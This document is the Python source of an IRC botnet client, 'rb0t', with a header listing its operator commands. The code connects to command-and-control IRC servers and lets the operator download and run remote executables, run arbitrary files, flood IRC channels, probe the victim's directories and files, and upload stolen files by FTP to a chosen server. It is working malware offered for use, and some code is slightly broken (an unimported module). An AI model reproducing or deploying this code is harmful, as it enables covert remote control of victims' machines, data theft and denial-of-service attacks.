#####################BOT COMMANDS ARE AS FOLLOWS####################
# !login <password> - logs you in.
# !logout - logs you out.
# !shutdown <password> - shuts the bot down
# !wget <url of file> <filename to save as> <1/0> - downloads file and executes if ends with 1 - does not execute if ends with 0
# !run <path\file.exe> - EG. !run c:\windows\calc.exe - Simply imputting "!run calc.exe" will attempt to run from the current folder
# !version - Bot will reply with the current version.
# !visit <url> - Will visit the supplied URL
# !ircflood <server> <port> <#chan> - Floods the specified IRC CHANNEL on the specified server. This will only be effective with alot of bots.
# !os - Replies with operating system information.
# !checkdir <DIR> - Checks if a directory exists and replies with the answer - eg. !checkdir c:\windows
# !checkfile <DIR\FILE.EXE> - Checks if a file exists and replies with the answer - eg. !checkfile c:\windows\explorer.exe
# !ftpsend <DIR\FILE.EXE> - Gets ready to send the file specified - use !ftpgo after this
# !ftpgo <server> <login> <pass> <file2saveas> - This uploads the file you specified with ftpsend to <server> with <login>:<pass> and saves it as <file2saveas>
##########################END#######################################

import sys, random, urllib2, string, time, os, re, socket, geoip, ftplib

#GET OUR IP AND COUNTRY CODE
myip = socket.gethostbyname(socket.gethostname())
mycountry = geoip.country(myip, 'winip.dat')

#<CONFIG>
irc_host1 = "irc.asdasdas.net"
irc_host2 = "irc.lskdjfklsdjfkl.com"
irc_host3 = "irc.lksjdfkljkljdf.com"
irc_host4 = "irc.malvageasdasdasdr.com"
irc_host5 = "irc.malvageasdasdr.com"
irc_port1 = 6667
irc_port2 = 6667
irc_port3 = 6667
irc_port4 = 6667
irc_port5 = 6667
irc_channel = "#CHANNEL"
irc_nick = "[rb0t]" + str(random.randint(1111111,9999999)) + "[" + mycountry + "]"
bot_pass = "passw0rd"
bot_owner = "YOURNICKHERE"
#</CONFIG>

#BOT VERSION AND RESET LOGIN ON STARTUP
bot_version = "rb0t version 1.0 - coded by ro_0t"
loggedin = 1

#GET INFORMATION FROM REGISTRY
def get_registry_value(key, subkey, value):
    import _winreg
    key = getattr(_winreg, key)
    handle = _winreg.OpenKey(key, subkey)
    (value, type) = _winreg.QueryValueEx(handle, value)
    return value

#RETRIEVE OS INFORMATION FOR OUR !OS COMMAND
def os_version():
    def get(key):
        return get_registry_value(
            "HKEY_LOCAL_MACHINE",
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            key)
    os = get("ProductName")
    sp = get("CSDVersion")
    build = get("CurrentBuildNumber")
    return "%s %s (build %s)" % (os, sp, build)


#TRY CONNECTING TO IRC
try:
    irc_sock = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
    irc_sock.connect ((irc_host1, irc_port1))
#EXIT IF WE GET AN ERROR TRY THE NEXT HOST AND SO ON - THIS TRIES 5 HOSTS - YOU CAN ADD MORE IF YOU WISH.
except:
    try:
        irc_sock.connect ((irc_host2, irc_port2))
    except:
        try:
            irc_sock.connect ((irc_host3, irc_port3))
        except:
            try:
                irc_sock.connect ((irc_host4, irc_port4))
            except:
                try:
                    irc_sock.connect ((irc_host5, irc_port5))
                except:
                    sys.exit(1)

#SEND NICK AND USER ID THEN JOIN OUR CHANNEL
irc_sock.send (( "NICK %s \r\n") % (irc_nick))
irc_sock.send (( "USER %s 8 * :X\r\n" ) % (irc_nick))
irc_sock.send (( "JOIN %s \r\n" ) % (irc_channel))

#THIS IS A LOOP WHICH RECIEVES ALL INPUT FROM IRC AND DECIDES WHAT TO DO WITH IT
while True:
    recv = irc_sock.recv( 4096 )
    
    #IF WE RECIEVE A PING THEN WE PONG BACK WITH THE INFORMATION.
    if recv.find ( 'PING' ) != -1:
        irc_sock.send ( 'PONG ' + recv.split() [ 1 ] + '\r\n' )

    #CHECK IF BOT_OWNER QUITS OR LEAVES AND LOG HIM OUT IF HE DOES
    if recv.find ( 'QUIT' ) != -1 and recv.find( bot_owner ) != -1:
        loggedin = 1
    if recv.find ( 'PART' ) != -1 and recv.find( bot_owner ) != -1:
        loggedin = 1

    #IF WE RECIEVE A MESSAGE THEN THIS SPLITS THE USERNAME/HOST AND MESSAGE INTO SEPERATE VARIABLES
    if recv.find ( 'PRIVMSG' ) != -1:
        irc_user_nick = recv.split ( '!' ) [ 0 ] . replace ( ':', '', 1 )
        irc_user_host = recv.split ( '@' ) [ 1 ] . split ( ' ' ) [ 0 ]
        irc_user_message = ''.join ( recv.split ( ':', 2 ) [ 2: ] ).replace("\r\n", "")

        #BASIC LOGIN/LOGOUT AND SHUTDOWN COMMANDS
        if irc_user_message == "!login " + bot_pass and irc_user_nick == bot_owner and loggedin == 1:
            irc_sock.send(("PRIVMSG %s :Login accepted.\r\n") % (irc_channel))
            loggedin = 2
        if irc_user_message == "!logout" and irc_user_nick == bot_owner and loggedin == 2:
            irc_sock.send(("PRIVMSG %s :You have been logged out.\r\n") % (irc_channel))
            loggedin = 1
        if irc_user_message == "!shutdown " + bot_pass and irc_user_nick == bot_owner and loggedin == 2:
            irc_sock.send(("PRIVMSG %s :Shutting down...\r\n") % (irc_channel))
            sys.exit(1)
            
        #!WGET COMMAND - SYNTAX IS "!WGET HTTP://WWW.FILESERVER.COM/FILE2DOWNLOAD.EXE SAVEFILEAS.EXE 1 (OR 0)" 1 = RUN FILE ONCE DOWNLOADED - 0 = DO NOT RUN. 
        if irc_user_message.startswith( "!wget" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            try:
                wgetall = irc_user_message.split()
                wget = wgetall[1]
                wgetsave = wgetall[2]
                if wgetall[3] == "1":
                    irc_sock.send(("PRIVMSG %s :Downloading  - %s - Saving as " + wgetsave + " - Executing on completion\r\n") % (irc_channel, wget))
                    try:
                        file2down = urllib2.urlopen(wget)
                        output = open(wgetsave, 'wb')
                        output.write(file2down.read())
                        output.close()
                        irc_sock.send(("PRIVMSG %s :Download complete. Executing file...\r\n") % (irc_channel))
                        os.popen3(wgetsave)
                    except:
                        irc_sock.send(("PRIVMSG %s :Error Downloading File\r\n") % (irc_channel))
                        
                elif wgetall[3] == "0":
                    irc_sock.send(("PRIVMSG %s :Downloading  - %s - Saving as " + wgetsave + "\r\n") % (irc_channel, wget))
                    try:
                        file2down = urllib2.urlopen(wget)
                        output = open(wgetsave, 'wb')
                        output.write(file2down.read())
                        output.close()
                        irc_sock.send(("PRIVMSG %s :Download complete.\r\n") % (irc_channel))
                    except:
                        irc_sock.send(("PRIVMSG %s :Error Downloading File\r\n") % (irc_channel))
                    
                elif wgetall[3] != "0" and wgetall[2] != "1":
                    pass
            except:
                pass

        #!RUN COMMAND - SYNTAX IS "!RUN FILENAME.EXE" - THIS IS BASICALLY FOR RUNNING FILES WHICH YOU DOWNLOADED AND DID NOT SELECT TO RUN ON COMPLETION
        if irc_user_message.startswith( "!run" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            try:
                runall = irc_user_message.split()
                file2run = runall[1]
                if os.path.isfile(file2run) == True:
                    irc_sock.send(("PRIVMSG %s :Executed file successfully.\r\n") % (irc_channel))
                    os.popen3(file2run)
                elif os.path.isfile(file2run) == False:
                    irc_sock.send(("PRIVMSG %s :ERROR: Could not find " + file2run + "\r\n") % (irc_channel))
            except:
                pass

        #!VERSION - SIMPLE VERSION COMMAND - BOT WILL REPLY WITH CURRENT VERSION
        if irc_user_message.startswith( "!version" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            irc_sock.send(("PRIVMSG %s :" + bot_version + "\r\n") % (irc_channel))

        #!VISIT - SYNTAX IS !VISIT <WEBSITE>
        if irc_user_message.startswith( "!visit" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            try:
                urlall = irc_user_message.split()
                url2visit = urlall[1]
                if url2visit.startswith( "http:" ) == False:
                    irc_sock.send(("PRIVMSG %s :Syntax Error: eg. !visit http://www.google.com\r\n") % (irc_channel))
                elif url2visit.startswith( "http:" ) == True:
                    webbrowser.open(url2visit)
                    irc_sock.send(("PRIVMSG %s :Site opened successfully.\r\n") % (irc_channel))
                else:
                    pass
            except:
                pass

        #!IRCFLOOD - SYNTAX IS !IRCFLOOD <SERVER> <PORT> <CHANNEL>
        if irc_user_message.startswith( "!ircflood" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            ircflood = irc_user_message.split()
            floodserv = ircflood[1]
            floodport = int(ircflood[2])
            floodchan = ircflood[3]
            floodnick = mycountry + str(random.randint(111111111,9999999999))
            floodmsg = str(random.randint(1111111111111111111111111,9999999999999999999999999)) * 11
            fld = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
            fld.connect ((floodserv, floodport))
            time.sleep(1)
            fld.send (( "NICK %s \r\n") % (floodnick))
            fld.send (( "USER %s 8 * :X\r\n" ) % (floodnick))
            time.sleep(5)
            fld.send (( "JOIN %s \r\n" ) % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            time.sleep(3)
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            time.sleep(3)
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            time.sleep(3)
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            fld.send (("PRIVMSG %s :" + floodmsg + "\r\n") % (floodchan))
            time.sleep(3)
            fld.send (("QUIT\r\n"))

        #!OS WILL RETURN WITH OPERATING SYSTEM INFORMATION
        if irc_user_message.startswith( "!os" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            osmsg = os_version()
            irc_sock.send(("PRIVMSG %s :OS: " + osmsg + "\r\n") % (irc_channel))

        #!CHECKDIR - SYNTAX: !CHECKDIR C:\WINDOWS - WILL RETURN TRUE IF WINDOWS DIRECTORY EXISTS IN C:\
        if irc_user_message.startswith( "!checkdir" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            dir2chk = irc_user_message[10:]
            if os.path.isdir(dir2chk) == True:
                irc_sock.send(("PRIVMSG %s :Directory - " + dir2chk + " - Exists.\r\n") % (irc_channel))
            elif os.path.isdir(dir2chk) == False:
                irc_sock.send(("PRIVMSG %s :Directory - " + dir2chk + " - DOES NOT Exist.\r\n") % (irc_channel))

        #!CHECKFILE - SYNTAX: !CHECKFILE C:\WINDOWS\EXPLORER.EXE - WILL RETURN TRUE IF EXPORER.EXE EXISTS IN WINDOWS DIRECTORY
        if irc_user_message.startswith( "!checkfile" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            file2chk = irc_user_message[11:]
            if os.path.isfile(file2chk) == True:
                irc_sock.send(("PRIVMSG %s :File - " + file2chk + " - Exists.\r\n") % (irc_channel))
            elif os.path.isfile(file2chk) == False:
                irc_sock.send(("PRIVMSG %s :File - " + file2chk + " - DOES NOT Exist.\r\n") % (irc_channel))

        #!FTPSEND - SYNTAX: !FTPSEND <dir\file2send.exe>
        if irc_user_message.startswith ( "!ftpsend" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            file2ftp = irc_user_message[9:]
            if os.path.isfile(file2ftp) == True:
                irc_sock.send(("PRIVMSG %s :Ready to transfer file - use !ftpgo <server> <login> <pass> <file2saveas>\r\n") % (irc_channel))
            elif os.path.isfile(file2ftp) == False:
                irc_sock.send(("PRIVMSG %s :COULD NOT FIND FILE TO TRANSFER - PLEASE MAKE SURE YOU ENTERED THE CORRECT PATH AND FILE NAME\r\n") % (irc_channel))
        #!FTPGO - SYNTAX: !FTPGO <server> <login> <pass> <file2saveas>
        if irc_user_message.startswith ( "!ftpgo" ) == True and irc_user_nick == bot_owner and loggedin == 2:
            try:
                file2ftp
            except NameError:
                file2ftp = None
                
            if file2ftp != None:
                try:
                    ftpall = irc_user_message.split()
                    ftpsrv = ftpall[1]
                    ftplogin = ftpall[2]
                    ftppass = ftpall[3]
                    ftpsaveas = ftpall[4]
                except:
                    pass
                try:
                    ftpup = ftplib.FTP(ftpsrv,ftplogin,ftppass)
                    ftpf = open(file2ftp,'rb')
                    ftpup.storbinary('STOR ' + ftpsaveas, ftpf)
                    ftpf.close()
                    ftpup.quit()
                    irc_sock.send(("PRIVMSG %s :File successfully uploaded as " + ftpsaveas + "\r\n") % (irc_channel))
                except:
                    pass
            else:
                irc_sock.send(("PRIVMSG %s :You did not set a file to send - use !ftpsend <file> first!\r\n") % (irc_channel))

